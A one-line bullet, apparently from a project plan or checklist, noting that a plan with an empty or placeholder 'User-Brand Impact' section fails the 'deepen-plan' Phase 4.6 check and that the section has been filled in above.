- A plan whose `## User-Brand Impact` section is empty/placeholder fails `deepen-plan` Phase 4.6 — it is filled above.
